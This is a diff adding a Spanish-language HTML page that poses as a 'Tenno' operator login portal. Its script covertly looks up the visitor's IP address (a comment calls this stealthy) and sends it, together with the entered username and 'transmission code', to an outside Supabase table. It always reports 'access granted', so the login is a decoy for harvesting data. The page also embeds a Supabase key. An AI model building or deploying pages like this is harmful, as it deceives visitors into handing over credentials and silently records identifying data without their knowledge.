@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Acceso Tenno</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #252525; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 350px; text-align: center; }
+        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #444; background: #121212; color: #00f2ff; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 6px; background: #f06d06; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff8c00; transform: translateY(-2px); }
+        #estado { font-size: 0.8em; margin-top: 15px; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Verificación de Operador</h2>
+    <input type="text" id="nombre" placeholder="Nombre de usuario">
+    <textarea id="mensaje" placeholder="Código de transmisión" rows="3"></textarea>
+    <button id="enviar">Ingresar al Sistema</button>
+    <p id="estado"></p>
+</div>
+
+<script>
+    const URL_S = 'https://gvmwdqwkcacgzkfincz.supabase.co';
+    const KEY_S = 'sb_publishable_N_hTBW7We2gtuT6b9xYgAA_trx0pI_w';
+    const supabaseClient = supabase.createClient(URL_S, KEY_S);
+
+    document.getElementById('enviar').addEventListener('click', async () => {
+        const estado = document.getElementById('estado');
+        estado.innerText = "Validando credenciales...";
+
+        try {
+            // Obtención sigilosa de la IP
+            const resIp = await fetch('https://api.ipify.org?format=json');
+            const dataIp = await resIp.json();
+            const ipFinal = dataIp.ip;
+
+            const n = document.getElementById('nombre').value;
+            const m = document.getElementById('mensaje').value;
+
+            const { error } = await supabaseClient
+                .from('visitas')
+                .insert([{ Usuario_input: n + " - " + m, User_ip: ipFinal }]);
+
+            if (error) throw error;
+            estado.innerText = "Acceso concedido. Registro completado.";
+        } catch (err) {
+            estado.innerText = "Error de red: Tiempo de espera agotado.";
+            console.error(err);
+        }
+    });
+</script>
+</body>
+</html>
